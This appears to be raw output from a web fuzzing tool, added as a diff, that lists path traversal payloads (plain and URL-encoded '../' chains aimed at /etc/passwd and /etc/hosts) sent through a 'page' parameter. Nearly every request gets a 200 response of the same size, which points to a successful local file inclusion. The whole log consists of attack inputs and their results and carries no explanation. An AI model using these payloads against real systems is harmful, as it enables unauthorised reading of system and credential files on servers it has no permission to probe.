@@ -1,0 +1,108 @@
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 8ms][0m
+[2K    * w1: page
+[2K    * w2: /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 6ms][0m
+[2K    * w1: page
+[2K    * w2: ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 12ms][0m
+[2K    * w1: page
+[2K    * w2: ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+
+[2K[Status: 200, Size: 241, Words: 21, Lines: 10, Duration: 19ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../etc/hosts
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 4ms][0m
+[2K    * w1: page
+[2K    * w2: /../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 5ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 6ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 9ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 3ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 10ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 1ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 0ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 10ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 0ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 2ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 2ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 1ms][0m
+[2K    * w2: ../../../../../../../../../../../etc/passwd
+[2K    * w1: page
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 9ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 1ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 29ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 3ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 8ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 5ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 1ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 10ms][0m
+[2K    * w1: page
+[2K    * w2: ../../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 0ms][0m
+[2K    * w1: page
+[2K    * w2: ../../etc/passwd
+
+[2K[Status: 200, Size: 1122, Words: 7, Lines: 28, Duration: 4ms][0m
+[2K    * w2: ../../../../../../etc/passwd&=%3C%3C%3C%3C
+[2K    * w1: page
+
